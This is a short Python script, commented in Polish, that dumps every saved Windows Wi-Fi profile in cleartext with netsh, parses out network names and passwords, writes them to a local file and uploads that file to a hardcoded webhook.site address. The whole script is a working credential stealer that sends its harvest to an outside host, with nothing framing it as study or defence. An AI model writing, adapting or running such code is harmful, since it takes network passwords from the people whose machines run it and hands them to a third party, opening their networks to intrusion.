import os
import subprocess
import sys

import requests

# url for output in web
URL = "https://webhook.site/d9b6686a-dc1f-46f3-8b91-9231c1a457fd"

# create a file
passowrd_file = open("password.txt", "w")
passowrd_file.write("Witam, to Twoje haslo! :\n\n")
passowrd_file.close()

# lists
wifi_files = []
wifi_name = []
wifi_password = []

# use python to run cmd command
command = subprocess.run(
    ["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True
).stdout.decode()

# grab current directory
path = os.getcwd()

# cala magia
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, "r") as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if "keyMaterial" in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("password.txt", "a")
                            print("SSID " + x, "Password :" + y, sep="\n")
                            sys.stdout.close()

# wysylanie magii
with open("password.txt", "rb") as f:
    r = requests.post(URL, data=f)
